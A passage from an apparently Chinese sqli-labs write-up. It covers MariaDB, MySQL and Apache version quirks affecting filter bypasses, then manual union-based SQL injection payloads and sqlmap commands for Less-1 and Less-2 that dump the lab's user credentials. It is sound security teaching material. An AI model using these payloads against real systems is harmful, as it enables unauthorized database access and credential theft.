函数的问题。但是，离谱的事情在于，<kbd>select</kbd> 语句查询的结果竟然为 <kbd>NULL</kbd>。同一个变量使用两种不同的查询方法竟然可以查出两种完全相反的值。</p><img src="https://bu.dusays.com/2022/09/04/6314b871dfc5a.webp" alt="" style="zoom:75%"><p>  笔者又另外配置了 MySQL 环境并对这一问题再次研究，发现所测试各版本的 MySQL 中均不存在该问题，两种方法的查询结果都为空。</p><img src="https://bu.dusays.com/2022/09/04/6314b8726d13d.webp" alt="" style="zoom:75%"><p>  如此特殊的情况很难不怀疑是靶机环境中出现了错误，使用 <kbd>select</kbd> 语句时会将空值等价于 <kbd>NULL</kbd> 值，为此笔者又在靶机中用两种方法查询其他值为空的全局变量，这次竟然就正常了，也就是说，查询结果不同的情况基本只针对于该变量。那很可能只是个小 <kbd>bug</kbd> 毕竟这么离谱。除非，是 MariaDB 的问题。</p><p>  虽然全文中都默认靶机所使用的数据库管理系统为 MySQL，但事实上使用的是 <kbd>Kali</kbd> 自带的 MariaDB，可作为 MySQL 的“平替”，实际上的操作也与 MySQL 几乎完全一致，虽然个人对两种系统的区别并没有深入研究过，但至少知道直接替换使用是基本不会出现问题的。作为验证，笔者在其他环境中安装了与靶机相同版本的 MariaDB，竟然成功复现了该结果。</p><img src="https://bu.dusays.com/2022/09/04/6314b872ee3af.webp" alt="" style="zoom:75%"><p>  可以确定了，就是 MariaDB 的问题。为确保不只是该版本的小 <kbd>bug</kbd>，笔者又测试 MariaDB 的各个不同版本，结果均复现成功。好吧，MariaDB 的问题。<br>  仔细翻阅了 MySQL 和 MariaDB 的官方手册，发现官方对两个系统中变量 <kbd>secure_file_priv</kbd> 的描述十分耐人寻味。</p><img src="https://bu.dusays.com/2022/09/04/6314b8738e432.webp" alt="" style="zoom:75%"><p>  MySQL 中的描述较多，其中关键在于准确表达了三种值及其意义，而 MariaDB 则使用一句话简单概括了一下，谷歌翻译一下就是：</p><div class="note info simple"><p>LOAD DATA, SELECT … INTO 和 LOAD FILE() 仅适用于指定路径中的文件。 如果未设置、默认值或设置为空字符串，则语句将适用于任何可访问的文件。</p></div><p>  也就是说，MariaDB 只定义了两种情况，<strong>空</strong>与其他，其中空依旧是无任何限制，而其他则表示仅限于指定地址。因此，MariaDB 中并没有将 <kbd>NULL</kbd> 定义为禁止操作，而是将其等价于空。从某种意义来说，笔者倒是十分认同这样的处理。</p></li><li><p>解决方案</p><p>  其实只需要改用正儿八经的 MySQL 就可以了，不过笔者无意大改环境，况且该问题可以被绕过而不影响解题，因此实操中将保留该问题，或者说，其实这还称不上是问题。</p></li></ul><h4 id="MySQL-版本问题">MySQL 版本问题</h4><ul><li><p>问题描述</p><p>  在 <a href="#Less-26">Less-26</a> 中使用 <kbd>%A0</kbd> 绕过空格时发现并不能成功绕过。</p><img src="https://bu.dusays.com/2022/11/14/637121ab5b8e3.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  参考了许多师傅的题解之后发现，基本上大家都能直接使用 <kbd>%A0</kbd> 绕过空格，如下图所示，从网页末的回显可以看出，PHP 本身并不认识该字符，该字符并没有被过滤。</p><img src="https://bu.dusays.com/2022/11/14/637121ab5d393.webp" alt="" style="zoom:75%"><p>  在本地配置相同调试，发现在使用 MySQL 5 版本时可以成功绕过，而换成 MySQL 8 版本时则出现了与靶机中一致的情况。</p><img src="https://bu.dusays.com/2022/11/14/637121ab5c139.webp" alt="" style="zoom:75%"><p>  如图第一行数据为所执行的 SQL 语句，可知 MySQL 8 并不支持将 <kbd>%A0</kbd> 视作空格处理，而是单纯的未知字符，而 MySQL 5 则能以空格处理。</p></li><li><p>解决方案</p><p>  其实笔者一直尝试不用该字符绕过，后来发现虽然可以解题，但毕竟不是长久之计，知识点比较重要。因此建议配置 MySQL 5，不过笔者无意大改环境，而且这个问题依然可以被其他解法绕过，因此实操亦将保留该问题。</p></li></ul><h4 id="Apache-版本问题">Apache 版本问题</h4><ul><li><p>问题描述</p><p>  在 <a href="#Less-26">Less-26</a> 中使用 <kbd>%0B</kbd> 会被过滤掉。</p><img src="https://bu.dusays.com/2022/11/14/637121ab5f050.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  该问题与前述的 MySQL 版本问题的主要表现基本一致，因此笔者也一度认为依然是 MySQL 不同版本的解析问题，事实上观察底部回显数据可知，上述两个字符在被传入 MySQL 之前便已经被删除了。在测试了其他师傅的靶场环境后发现并没有被过滤，也就是说现有的正常运行的环境中，PHP 程序的正则表达式中的 <kbd>&#92;s</kbd> 并不会匹配上述两个字符，而笔者环境下则匹配成功了。如下图，虽然 <kbd>%0B</kbd> 会被回显为 <kbd>♂</kbd> 符号，有的浏览器甚至无法显示，但是实测这并不影响其在 MySQL 5 中被正常解析，当然其同样不能应用于 MySQL 8 版本中。</p><img src="https://bu.dusays.com/2022/11/14/637121ab6237c.webp" alt="" style="zoom:75%"><p>  在本地测试了各版本的 PHP 之后，结果并没有任何变化，可以确定的是这与 PHP 的版本并无关系，那么影响其正则匹配就是 PHP 的运行环境了，也就是 Apache 的问题。为确认这一点笔者测试了相同 PHP 与 MySQL 环境下四个常用 Apache 版本 <kbd>2.4.7</kbd>、<kbd>2.4.10</kbd>、<kbd>2.4.29</kbd> 以及 <kbd>2.4.39</kbd>，<psw>其实就是现成的很多靶机最常用的四个版本</psw>，结果如下图：</p><img src="https://bu.dusays.com/2022/11/14/637121aab8382.webp" alt="" style="zoom:75%"><p>  其中仅有 Apache 2.4.7 没有将 <kbd>%0B</kbd> 过滤掉，后续版本均完成了过滤操作，因此基本可以认定在较高版本中（目前只能确定为 <kbd>2.4.10</kbd> 及以后版本）正则表达式的 <kbd>&#92;s</kbd> 可以匹配垂直定位符号，即 <kbd>%0B</kbd>。而笔者所使用的靶机版本为 <kbd>2.4.54</kbd>，那显然是不行了。此外笔者对一些旧版本（低于 <kbd>2.4.7</kbd>）做了测试，均与上述结论相吻合。</p><p>  此外，有许多师傅提到 Windows 与 Linux 系统下的 Apache 也存在如上的解析偏差，关于这一点笔者并没有做验证，有机会可以探索探索。</p><p>  有意思的是，笔者用于测试的 <kbd>%7F</kbd> 字符（即退格符），在任何版本中都不会被过滤，虽然它不能作为空格被使用，但是在很多浏览器中都能被回显为空格，就输出美化来说，还是不错的。</p></li><li><p>解决方案</p><p>  切换 Apache 版本即可，该靶机广泛部署于 Apache 2.4.7 版本之上，就全民质检的结果来看，换成这个版本应该就可以顺利刷完题目。不过笔者无意大改环境，而且这个问题依然可以被其他解法绕过，因此实操亦将保留该问题。</p></li></ul><h2 id="基础挑战">基础挑战</h2><h3 id="Less-1">Less-1</h3><div class="note default flat"><p>GET - Error based - Single quotes - String</p></div><p>打开本题界面如图所示，界面中心有一句提示：<em>Please input the ID as parameter with numeric value.</em> 意为：请输入 ID 作为数值参数。据题意即需要用 GET 方法向服务器传递一个数值参数，参数名为 <kbd>ID</kbd>，不过实测参数名应为小写的 <kbd>id</kbd>.</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a53e581.webp" alt="" style="zoom:75%"><h4 id="手工注入">手工注入</h4><ul><li><p>首先简单地传入数据 <kbd>1</kbd>，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/07/05/62c3e5ab1cf7b.webp" alt="" style="zoom:75%"><p>网页回显了一对用户名与密码，通过修改参数值可以得到不同的用户名与密码，理论上这样就能获取全部了。但是由于不确定 <kbd>id</kbd> 值是否连续且数据总数未知，仅仅通过逐个测试值来获取数据显然不够完善，因此还需继续操作。</p></li><li><p>为方便后续操作，应先判断该注入点为数字型注入还是字符型注入，实际上就是判断传入的数据与待拼接的 SQL 语句之间是否使用引号分隔（引号闭合包含参数），若为数字型注入则在后续操作中无需考虑引号闭合，而若为字符型注入则需要考虑注入后拼接的 SQL 语句的引号有效闭合问题。两种注入的示例如下两句 SQL 语句所示，其中数字 <kbd>1</kbd> 为注入数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> [表名] <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;     # 字符型注入</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> [表名] <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>;       # 数字型注入</span><br></pre></td></tr></table></figure><ul><li><p>判断数字型注入的方法较为简单，构造两个 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p>其中，<kbd>and</kbd> 为逻辑运算符，当前后均为真时值为真。由于 <kbd>1=1</kbd> 始终为真，而 <kbd>1=2</kbd> 始终为假，因此上述两个 <kbd>payload</kbd> 的实际值便是 <kbd>True</kbd> 与 <kbd>False</kbd>，对应为查询成功（<kbd>id=1</kbd>）与查询失败两种结果。当然，以上并没有考虑引号闭合问题，若两种 <kbd>payload</kbd> 返回的结果不同，则说明参数与 SQL 语句拼接时并没有使用引号分隔，即属于数字型注入。实测两种 <kbd>payload</kbd> 返回的结果相同，因此不属于数字型注入（结果相同是因为 <kbd>MySQL</kbd> 会对参数类型自动转化）：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5abd3726.webp" alt="" style="zoom:75%"></li><li><p>而判断字符型注入的方法则更复杂一些，关键在于对闭合符号的判断。不过，本题支持错误回显，因此针对本题可以直接在传入数据末尾添加转义字符 <kbd>\</kbd>（当然完全可以只传入转义字符），这样闭合符号会因为被转义而造成不闭合进而报错，此时便可在错误提示中直接观察到闭合字符。构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\ </span><br></pre></td></tr></table></figure><p>查看浏览器回显如下图所示，转义字符 <kbd>\</kbd> 之后的字符便是闭合字符，可以看出该处所使用的闭合字符为单引号 <kbd>&#39;</kbd>：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5abe026c.webp" alt="" style="zoom:75%"></li><li><p>当然，这里额外考虑没有错误回显时应如何判断闭合符号作为训练。</p><ul><li><p>由于 <kbd>MySQL</kbd> 的对于数据的包容性较强，会将错误数据自动转化为合法数据类型，除非遇到未闭合的闭合符号才会报错。假设待拼接 SQL 语句使用单引号 <kbd>&#39;</kbd> 作为闭合字符，而所需数据为数字，则传入 <kbd>1&#34;)</kbd>、<kbd>1-</kbd>、<kbd>1&#39;&#39;(</kbd> 等参数都将被解释为数字参数 <kbd>1</kbd>。其中第三个实例 <kbd>1)&#39;&#39;(</kbd> 括号中间为两个连续的单引号，虽然单引号作为闭合符号，但是由于两个单引号分别与参数前后单引号形成闭合关系，因此不存在语法错误，依然可以正常解析。当然，参数被闭合字符分割为两段后第二段是无效的，同时两个引号中间务必为<strong>空</strong>，因为两段字符串中间的无效连接字符会造成语法错误！</p></li><li><p>基于上述条件，在 <kbd>MySQL</kbd> 中就无法通过直接逐个测试闭合符号并配合注释符验证的方式判断闭合符号，因为大部分测试符号都将导致查询成功！所以这里需要分步检验，首先，构造如下两个 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p>由于字符数据总是直接被单引号或双引号闭合，因此只要是字符型注入，上述两个 <kbd>payload</kbd> 必然会有一个被解释为闭合符号而出现语法错误，另一个则因为未被匹配为闭合符号而自动转化为数据 <kbd>1</kbd> 进而查询成功！</p></li><li><p>考虑第一种情况，单引号查询失败而双引号查询成功，即可认为单引号为有效闭合符号，那么就需要进一步验证闭合符号后是否含有括号（<kbd>MySQL</kbd> 中闭合符号可由单双引号加多层括号构成）。构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure><kbd>--+</kbd> 作为注释符将待拼接 SQL 语句后续部分注释，若闭合符号仅为单引号，则数据中的单引号将成功闭合，查询成功；若闭合符号还有括号，则会因为未完全闭合而造成语法错误，查询失败。由此即可判断是否有括号，而具体有多少个括号，则可构造如下 <kbd>payload</kbd> 进一步论证：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)--+</span><br><span class="line">?id=1&#x27;))--+</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li><li><p>而另一种情况即单引号查询成功而双引号查询失败，因此双引号为有效闭合符号，而对于后续括号的判断，则参照上一条即可。</p></li><li><p>综上对本题进行测试，先判断单双引号，结果如下图：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5acc7a59.webp" alt="" style="zoom:75%"><p>由以上结果可暂认为本题为单引号闭合，然后再判断是否存在括号闭合，结果如下图：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5acedc4c.webp" alt="" style="zoom:75%"><p>在仅使用单引号来测试闭合符号的情况下查询成功，因此本题为单引号闭合。</p></li></ul></li></ul></li><li><p>接下来就需要了解当前表被查询的列数，进而通过列数得知浏览器回显的数据为哪几列，这样后续操作就可以控制所需数据在浏览器中的显示情况。首先使用 <kbd>order by</kbd> 语句确认列数，它会根据指定列对结果集进行排序，当然排序并不是目的，重点在于指定列的方式，即可以使用列名，也可以使用列的序号，而指定列不存在则会报错。我们可以以序号指定列，由于序号是根据表的结构自动判定的，因此表中含有的列数即为序号的最大值。所以，可以使用 <kbd>order by</kbd> 语句逐个测试序号，能够成功查询的最大值即为列数。构造 <kbd>payload</kbd> 如下（注意数据闭合）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 1--+</span><br><span class="line">?id=2&#x27; order by 2--+</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>测试结果如下图所示，最大成功查询序号为 <kbd>3</kbd>，因此该表被查询列数为 <kbd>3</kbd>。根据现有内容可以判断三列数据应该为 <kbd>id</kbd>、<kbd>用户名</kbd> 和 <kbd>密码</kbd>。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5acede79.webp" alt="" style="zoom:75%"></li><li><p>知道了列数就可以研究浏览器回显位了，虽然知道回显的应该为 <kbd>用户名</kbd> 与 <kbd>密码</kbd> 两位数据，但是由于我们需要的不仅仅是该表中的单行数据，因此后续操作实际上都是基于复合查询以查询指定数据，并将数据复合于结果集中的相应位置才能完成回显，在此之前我们就需要基于相同的方法判断回显位，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>其中，<kbd>union</kbd> 操作符用于将前后相同列数的查询结果集按查询顺序合并，而后面一段我们构造的查询语句因为没有指定表，因此返回的数据即为所查询内容。此外，前部分查询由于条件为 <kbd>id=-1</kbd> 因而返回空集，因此实际查询的结果就是 <kbd>1, 2, 3</kbd> 三列数字，而根据浏览器显示的数字即可判断回显位。测试结果如下图所示，可知第 <kbd>2</kbd>、<kbd>3</kbd> 位为回显位，且第二位对应用户名，第三位对应密码。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a6e7c3e.webp" alt="" style="zoom:75%"></li><li><p>现在就可以查询需要的信息并控制回显于浏览器中了，只要将查询内容替换上述 <kbd>payload</kbd> 中的 <kbd>2</kbd> 或 <kbd>3</kbd> 即可。首先查询当前数据库的表名，使用 <kbd>databese()</kbd> 函数即可，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>由于替换的是 <kbd>2</kbd> 的位置，因此结果将显示于用户名处，如下图所示，当前数据库名为 <kbd>security</kbd>：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5adb2523.webp" alt="" style="zoom:75%"></li><li><p>有了数据库名就可以查询该库中的所有表了，不过在这里肯定就无法使用 <kbd>show tables;</kbd> 语句了，毕竟只能通过 <kbd>select</kbd> 语句查询结果。所以就需要使用 <kbd>Information_schema</kbd> 数据库，该库中储存了数据库元数据，其中就包括所有表名。常用的各数据的结构如下图所示：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5ae08d5f.webp" alt="" style="zoom:75%"><p>由此可以构造查询表名的 SQL 语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure><p>不过，该查询语句返回的是一列数据且数量未知，而 <kbd>union</kbd> 语句则要求查询结果列数相同且浏览器只回显一行数据。因此需要将这一列数据合并为一串字符，这里就需要 <kbd>group_concat()</kbd> 函数。该函数负责按分组将结果集输出为不同行，若未将数据指定分组，则将所有数据连接为一行字符串，用法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure><p>由上便可以构造查询当前数据库中的所有表名的 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3--+</span><br></pre></td></tr></table></figure><p>由于替换的是 <kbd>2</kbd> 的位置，因此结果将显示于用户名处，如下图所示，共有四张表：<kbd>emails</kbd>、<kbd>referers</kbd>、<kbd>uagents</kbd>、<kbd>users</kbd>。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5adc68b4.webp" alt="" style="zoom:75%"></li><li><p>有了所有表名就可以使用相同方法获取各个表中的所有列名，进而通过列名获取所有数据。首先分别查询四张表中的各列，由于不同数据库可能含有同名字段，因此限定数据库为 <kbd>security</kbd>，构造四个 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;referers&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;uagents&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br></pre></td></tr></table></figure><p>由于替换的是 <kbd>2</kbd> 的位置，因此结果将显示于用户名处，如下图所示可知表 <kbd>emails</kbd> 中含有两列，分别为 <kbd>id</kbd> 和 <kbd>email_id</kbd>；表 <kbd>referers</kbd> 中含有三列，分别为 <kbd>id</kbd>、<kbd>referer</kbd> 和 <kbd>ip_address</kbd>；表 <kbd>uagents</kbd> 中含有四列，分别为 <kbd>id</kbd>、<kbd>uagent</kbd>、<kbd>ip_address</kbd> 和 <kbd>username</kbd>；表 <kbd>users</kbd> 中则有六列，分别为 <kbd>id</kbd>、<kbd>username</kbd> 和 <kbd>password</kbd>。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5af02efb.webp" alt="" style="zoom:75%"></li><li><p>名称都知道了，就不需要 <kbd>information_schema</kbd> 中的数据了，保持正常查询并将结果集转化为一串字符输出即可，以表 <kbd>emails</kbd> 为例构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(id,email_id) from emails),3--+</span><br></pre></td></tr></table></figure><p>这样就可以在浏览器回显中看到表中所有数据了，不过，显示的样式如图所示:</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a6e7eaf.webp" alt="" style="zoom:75%"><p>所有数据都在同一行，且数据与数据之间直接相连，无法区分，这样的回显显然是非常不友好的。因此这里对输出结果稍作调整，首先是每组数据换行，只需设置 <kbd>group_concat()</kbd> 函数分隔符为 <kbd>&lt;br&gt;</kbd> 即可，SQL 语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(id,email_id separator <span class="string">&#x27;&lt;br&gt;&#x27;</span>) <span class="keyword">from</span> emails;</span><br></pre></td></tr></table></figure><p>然后需要将每组数据中的各项分隔开，而 <kbd>group_concat()</kbd> 函数无法在每组数据内部添加分隔符，因此这需要额外的操作。可以嵌套调用 <kbd>concat_ws()</kbd> 函数完成，该函数可将一组数据连接，同时，函数的第一个参数即为分隔符，使用如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;  -  &#x27;</span>,id,email_id) separator <span class="string">&#x27;&lt;br&gt;&#x27;</span>) <span class="keyword">from</span> emails;</span><br></pre></td></tr></table></figure><p>这样整理之后，数据就可以直观体现于浏览器上了，构造四个 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,email_id) separator &#x27;&lt;br&gt;&#x27;) from emails),3--+</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,referer,ip_address) separator &#x27;&lt;br&gt;&#x27;) from referers),3--+</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,uagent,ip_address,username) separator &#x27;&lt;br&gt;&#x27;) from uagents),3--+</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3--+</span><br></pre></td></tr></table></figure><p>其中，<kbd>referers</kbd> 与 <kbd>uagents</kbd> 两张表为空表，<kbd>emails</kbd> 与 <kbd>users</kbd> 表内所有数据则如图所示：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a711874.webp" alt="" style="zoom:75%"></li></ul><h4 id="SQLMap-工具注入">SQLMap 工具注入</h4><ul><li><kbd>Kali</kbd> 中自带 <kbd>SQLMap</kbd>，因此可以直接使用。首先查询当前使用的数据库，使用如下命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-1/?id=1 --current-db</span><br></pre></td></tr></table></figure><p>其中，<kbd>-u</kbd> 指定目标 URL，<kbd>--current-db</kbd> 列出当前数据库。执行结果如图所示，因此当前数据库为 <kbd>security</kbd>。当然，若想查看所有数据库则可以使用 <kbd>-dbs</kbd> 来检索所有数据库。</p><img src="https://bu.dusays.com/2022/07/06/62c5319b9443e.webp" alt="" style="zoom:75%"></li><li><p>获取数据库名之后即可通过如下命令获取数据库中所有表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-1/?id=1 -D security --tables</span><br></pre></td></tr></table></figure><p>其中，<kbd>-D</kbd> 指定数据库，即 <kbd>security</kbd>，<kbd>--tables</kbd> 则列出所有的表。此外，若未指定数据库则将列出所有数据库中的所有表。执行结果如下图所示，可知数据库中共有四张表，分别为：<kbd>emails</kbd>、<kbd>referers</kbd>、<kbd>uagents</kbd>、<kbd>users</kbd>。</p><img src="https://bu.dusays.com/2022/07/06/62c5319b9b323.webp" alt="" style="zoom:75%"></li><li><p>获取表名后即可继续获取各个表中的所有字段，以查询 <kbd>emails</kbd> 表为例，使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-1/?id=1 -D security -T emails --column</span><br></pre></td></tr></table></figure><p>其中，<kbd>-T</kbd> 指定表名，<kbd>--column</kbd> 则列出表中所有字段。此外，若未指定数据库，则默认使用当前数据库，而若未指定表名，则查询指定数据库中所有表中的所有字段。因此，如下命令即可完成所有表中的字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-1/?id=1 --column</span><br></pre></td></tr></table></figure><p>查询结果如下，各表中字段内容与手工注入结果一致：</p><img src="https://bu.dusays.com/2022/07/06/62c534be0a07e.webp" alt="" style="zoom:75%"></li><li><p>然后便可以进一步查询表中各字段的数据了，以查询 <kbd>emails</kbd> 表为例，使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-1/?id=1 -D security -T emails -C id,email_id --dump</span><br></pre></td></tr></table></figure><p>其中，<kbd>-C</kbd> 指定字段，<kbd>--dump</kbd> 则列出指定字段内容。此外，若未指定数据库，则默认使用当前数据库，而若未指定表名，则查询指定数据库中所有表中的所有字段，若未指定字段，则默认列出所有字段内容。因此，如下命令即可查询当前数据库中的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-1/?id=1 --dump</span><br></pre></td></tr></table></figure><p>查询结果如下，各表中数据内容与手工注入结果一致，其中<kbd>referers</kbd> 与 <kbd>uagents</kbd> 两张表为空表：</p><img src="https://bu.dusays.com/2022/07/06/62c5319d5b1ec.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-2">Less-2</h3><div class="note default flat"><p>GET - Error based - Intiger based</p></div><p>打开本题界面如图所示，除了网页中的大号 <kbd>logo</kbd> 有所变化，其余均与 Less-1 一致，依然是向变量 <kbd>id</kbd> 传递数值参数。</p><img src="https://bu.dusays.com/2022/08/11/62f4b7703df39.webp" alt="" style="zoom:75%"><h4 id="手工注入-2">手工注入</h4><ul><li><p>首先简单地传入数据 <kbd>1</kbd>，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>网页正常回显，内容如图所示：</p><img src="https://bu.dusays.com/2022/08/11/62f4b7710b8d5.webp" alt="" style="zoom:75%"></li><li><p>判断是否为数字型注入，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p>查询结果如图所示，前一个查询成功，后一个查询失败，因此该注入点为数字型注入：</p><img src="https://bu.dusays.com/2022/08/11/62f4b77197cb0.webp" alt="" style="zoom:75%"></li><li><p>剩余步骤均可参考 Less-1 的手工注入部分，唯一区别在于本题为数字型注入，因此不需要考虑参数的闭合符号问题。大体步骤为：判断查询位数 -&gt; 判断回显位 -&gt; 获取数据库名 -&gt; 获取表名 -&gt; 获取列名 -&gt; 获取数据！本题所用的 <kbd>payload</kbd> 如下：</p><ol><li><p>判断查询位数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3--+</span><br><span class="line">?id=1 order by 4--+</span><br></pre></td></tr></table></figure></li><li><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 